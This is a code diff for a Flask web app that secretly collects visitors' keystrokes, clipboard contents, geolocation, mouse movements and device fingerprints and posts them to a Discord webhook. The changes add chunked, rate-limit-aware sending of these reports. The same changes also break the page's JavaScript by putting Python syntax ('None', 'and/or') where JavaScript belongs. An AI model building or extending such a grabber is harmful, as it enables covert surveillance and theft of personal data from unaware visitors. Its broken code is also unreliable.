@@ -2,6 +2,7 @@ from flask import Flask, request, render_template_string, jsonify
 import requests
 import os
 from functools import wraps
+import time
 
 app = Flask(__name__)
 # Read secret key from environment variable and set Flask config
@@ -22,8 +23,8 @@ def require_api_key(func):
     return decorated_function
 
 # The HTML template now injects the API key into the JavaScript.
-# Note: Exposing the secret key in client-side code is not secure,
-# but is shown here solely for demonstration on how to pass the key along.
+# WARNING: Exposing secret keys in client-side code is insecure,
+# but this is shown solely for demonstration on how to pass the key along.
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -192,7 +193,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           await new Promise(resolve => setTimeout(resolve, 1000));
         } catch {}
         
-        let location = { lat: null, lon: null, accuracy: null, speed: null };
+        let location = { lat: None, lon: None, accuracy: None, speed: None };
         try {
           await new Promise((resolve) => {
             navigator.geolocation.getCurrentPosition(
@@ -305,7 +306,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           storageSupport: storageSupport,
           installedFonts: installedFonts,
           vibrationSupported: ('vibrate' in navigator) ? "Yes" : "No",
-          pdfViewerEnabled: pdfViewerEnabled ? "True" : "False",
+          pdfViewerEnabled: pdfViewerEnabled and "True" or "False",
           canvasFingerprint: canvasFingerprint,
           mouseMovements: mouseMovements,
           keystrokes: keystrokes,
@@ -348,6 +349,24 @@ def home():
     # WARNING: Exposing secret keys in client-side code is insecure.
     return render_template_string(HTML_TEMPLATE, secret_key=app.config["SECRET_KEY"])
 
+def split_message(message, max_length=1900):
+    """
+    Splits a long message into chunks using newline as a delimiter.
+    """
+    lines = message.split('\n')
+    chunks = []
+    current_chunk = ""
+    for line in lines:
+        # If adding this line exceeds the max, start a new chunk.
+        if len(current_chunk) + len(line) + 1 > max_length:
+            chunks.append(current_chunk)
+            current_chunk = line
+        else:
+            current_chunk = current_chunk + "\n" + line if current_chunk else line
+    if current_chunk:
+        chunks.append(current_chunk)
+    return chunks
+
 @app.route("/collect", methods=["POST"])
 @require_api_key
 def collect():
@@ -361,6 +380,7 @@ def collect():
     if not DISCORD_WEBHOOK:
         return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500
 
+    # Build the information string
     info = f"""
 📊 **New Fingerprint Logged Device Information:**
 • **Screen:** {data.get('screenWidth')}x{data.get('screenHeight')}, {data.get('colorDepth')}-bit, DPR: {data.get('devicePixelRatio')}
@@ -432,7 +452,7 @@ def collect():
 • **Data:** "{data.get('clipboardData')}"
 
 📱 **Sensor Data:**
-• **Device Motion:** x:{data.get('motionData', {}).get('accX')}, y:{data.get('motionData', {}).get('accY')}, z:{data.get('motionData', {}).get('accZ')}
+• **Device Motion:** x: {data.get('motionData', {}).get('accX')}, y: {data.get('motionData', {}).get('accY')}, z: {data.get('motionData', {}).get('accZ')}
 • **Device Orientation:** Alpha: {data.get('orientationData', {}).get('alpha')}, Beta: {data.get('orientationData', {}).get('beta')}, Gamma: {data.get('orientationData', {}).get('gamma')}
 
 🔊 **Voices (Speech Synthesis):**
@@ -461,11 +481,16 @@ def collect():
 • **Location:** {ip_info.get("loc", "N/A")}
     """.strip()
 
-    try:
-        response = requests.post(DISCORD_WEBHOOK, json={"content": info})
-        response.raise_for_status()
-    except Exception as ex:
-        return jsonify({"status": "error", "message": f"Failed to post to Discord webhook: {ex}"}), 500
+    # Split the info into smaller chunks if necessary
+    chunks = split_message(info)
+    for chunk in chunks:
+        try:
+            response = requests.post(DISCORD_WEBHOOK, json={"content": chunk})
+            response.raise_for_status()
+            # Optional: Sleep briefly between messages to help avoid rate limits.
+            time.sleep(0.5)
+        except Exception as ex:
+            return jsonify({"status": "error", "message": f"Failed to post to Discord webhook: {ex}"}), 500
 
     return jsonify({"status": "ok"})
 
